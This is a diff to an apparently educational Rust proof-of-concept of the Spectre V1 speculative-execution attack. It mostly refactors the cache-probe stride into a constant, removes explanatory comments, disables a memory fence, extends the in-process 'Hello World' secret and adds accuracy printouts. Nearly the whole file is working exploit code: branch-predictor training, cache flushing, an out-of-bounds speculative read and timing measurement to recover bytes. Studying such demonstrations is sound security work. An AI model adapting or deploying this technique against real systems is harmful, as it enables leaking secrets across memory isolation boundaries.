@@ -16,6 +16,7 @@ const NUM_TRIES: u64 = 1000;
 const TRAINING_LOOPS: usize = 100;
 const ATTACK_LEAP: u64 = 10;
 const INBETWEEN_DELAY: u64 = 100;
+const MEM_STEP: usize = 256;
 
 // x86 read-time-stamp-counter instruction access, returns a 64-bit CPU cycle
 // timer, used for high-precision timing of cache hits and misses
@@ -53,6 +54,19 @@ fn init_attack() -> (Vec<bool>, Vec<u8>)
     (is_attack, attack_pattern)
 }
 
+
+
+
+
+
+
+
+
+
+
+
+
+
 //
 //  Spectre V1 Attack Gadget
 //
@@ -63,55 +77,29 @@ fn init_attack() -> (Vec<bool>, Vec<u8>)
 #[inline(never)]
 pub fn fetch_function(arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &[u8], idx: usize) -> u8
 {
-    // note that arr1 is passed in as a Vec, which puts the size of the
-    // structure into memory, if you pass arr1 as a simple array, the size is
-    // a constant, and you won't be able to delay the branch that checks if
-    // the array access is overflowing!
-
-    let /* mut */ val: usize;
-
-    // redundant check to make sure that the Spectre array access that
-    // violates the array boundaries doesn't generate an exception in the
-    // non-speculative path of the program, this then requires that this
-    // Spectre V1 attack mispeculate past two branches: 1) the branch in the
-    // if statement below and 2) the internal compiler branch to check the
-    // arr1 slice access inside the scope of the if statement
+    let val: usize;
     if idx < *arr1_len
     {
-      // get the array value, note that 1 out of 10 times this will be an
-      // access to the secret array using an out-of-bounds idx value, note
-      // that the other 9 accesses train the branch above and the the branch
-      // below that checks that the arr1 access is in bounds, if both
-      // mispeculate (and they will since the branch predictors just saw
-      // 9 times in a row that both branches were NOT taken), then the illegal
-      // access past the end of the rust array WILL HAPPEN 
       val = arr1[idx] as usize;
+      return arr2[val * MEM_STEP]
 
-      // now communicate the value read out to arr2, arr2 is just a huge array
-      // that is displaced from the cache before this function is called, by
-      // accessing it at val*512, we are assigning a specific cache block in
-      // the array to 'a', 'b', 'c', etc... Later we will read back the array
-      // to see check letter-associated line got referenced, and that will
-      // COMMUNICATE out the value of the ILLEGALLY read rust array value
-      return arr2[val * 512]
-
-      // CONFIRMING EXPERIMENT:
-      // Not a believer that the Spectre V1 attack is not actually working?
-      // Then replace the line above with the line commented out below, this
-      // will emit a string that is nowhere in memory, that looks as follows:
-      // Hello World Hello -> "Ifmmp!Xpsme!Ifmmp", that string only exists in the
-      // mispeculation stream :), if you see it on the output, that has to be
-      // Spectre V1 working!
-      // return arr2[(val+1) * 512]
+      // will emit a string that is nowhere in memory,
+      // "Hello World Hello" -> "Ifmmp!Xpsme!Ifmmp"
+      // return arr2[(val+1) * MEM_STEP]
     }
-
-    // quick note, while we are doing "stupid microarchitecture tricks" here,
-    // we still need everything to compute a real value or the incredibly
-    // smart rustc compiler will silently remove dead code, that is why you'll
-    // see everything doing non-commutative non-associative computation along
-    // with the microarchitecture tricks
     0
 }
+
+
+
+
+
+
+
+
+
+
+
 
 //
 // This function performs a single character read at the ILLEGAL arr1 address
@@ -144,7 +132,7 @@ pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &Vec<u8>
         // value read by the attack gadget, TODO: implement this without using
         // the CLFLUSH instruction, by blasting the cache
         for i in 0..256 {
-            unsafe { _mm_clflush(&arr2[i * 512]); }
+            unsafe { _mm_clflush(&arr2[i * MEM_STEP]); }
         }
 
         // get a valid index into ARR1
@@ -188,7 +176,7 @@ pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &Vec<u8>
           // off an MFENCE instruction to make sure it completes before the
           // attack is commenced
           unsafe { _mm_clflush(arr1 as *const Vec<u8> as *const usize as *const u8); }
-          unsafe { _mm_mfence(); }
+          //unsafe { _mm_mfence(); }
 
           // call the victim function (the Spectre V1 attack gadget) after it
           // has been trained to access an illegal address in SECRET[], note
@@ -205,6 +193,7 @@ pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &Vec<u8>
         // to get the result, looking for which block load returns the
         // fastest, as this is the value read, of course, lots of scenarios
         // will mess this up, which is why this is attempted many times
+        // unsafe { _mm_mfence(); }
         for i in (0..=255).rev()
         {
             // read every entry of ARR2[] to see which entries hit in the
@@ -220,7 +209,7 @@ pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &Vec<u8>
             let curr_char: u8 = attack_pattern[i];
 
             // compute the memory location to access
-            let ival = (curr_char as usize) * 512;
+            let ival = (curr_char as usize) * MEM_STEP;
             // get a start cycle timer count
             let time1 = rdtscp();
             // access the ARR2[] memory block
@@ -239,6 +228,13 @@ pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &Vec<u8>
     sum
 }
 
+
+
+
+
+
+
+
 //
 // do a Spectre V1 attack on the fetch_function above
 //
@@ -247,9 +243,26 @@ fn main()
     // legal array to access
     let arr1 = vec! [17u8, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
     // illegal array to access: "Hello World Hello  ..."
-    let secret: &'static str = "Hello World Hello   Hello World Hello   Hello World Hello   ";
+    // let secret: &'static str = "Hello World Hello   Hello World Hello   Hello World Hello   ";
+    let secret: &'static str = "Hello World Hello   Hello World Hello   Hello World Hello   Hello World Hello   Hello World Hello   Hello World Hello   Hello World Hello   Hello World Hello   Hello World Hello   Hello World Hello   Hello World Hello   QED";
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
     // manipulate this to get potentially better results
-    let secret_start:usize = 00;
+    let secret_start:usize = 129;
 
     // results array, the read_memory_byte function will put CUMULATIVE read
     // latency counts into the results array, thus the entry with the lowest
@@ -264,7 +277,7 @@ fn main()
     // it will load ARR2[X], which can be later detected as a hit, while all
     // other entries in the array (hopefully) miss, to ensure that each index
     // is in a different cache line, ARR2 uses a 512-byte blocking
-    let mut arr2: [u8; 256 * 512] = [0; 256 * 512]; // Placeholder, initialize with appropriate values
+    let mut arr2: [u8; 256 * MEM_STEP] = [0; 256 * MEM_STEP]; // Placeholder, initialize with appropriate values
 
     // the index from ARR1[] to the first entry of SECRET[], which could be
     // a large negative value or a small value, depending on the organization
@@ -354,7 +367,7 @@ fn main()
       // compute how accurate are our guesses
       total_letters += guessed_secret.len();
       for i in 0..guessed_secret.len() {
-        if secret.as_bytes()[i] == guessed_secret.as_bytes()[i]
+        if secret.as_bytes()[i+secret_start] == guessed_secret.as_bytes()[i]
         {
           correct_letters += 1;
         }
@@ -366,6 +379,8 @@ fn main()
           broken = true;
           break;
       }
+
+      println!("Interim stats: {:.2}% correct guesses. ({} out of {} letters).", (correct_letters as f64)/(total_letters as f64)*100.0, correct_letters, total_letters);
     }
 
     // gotta get to here to stop dead-code removal!
@@ -380,6 +395,7 @@ fn main()
     }
     else // broken
     {
+      println!("Final stats: {:.2}% correct guesses. ({} out of {} letters).", (correct_letters as f64)/(total_letters as f64)*100.0, correct_letters, total_letters);
       println!("This target mitigates Spectre V1 or memory alignment does not permit the attack, rebuild and rerun to attempt again...");
     }
 }
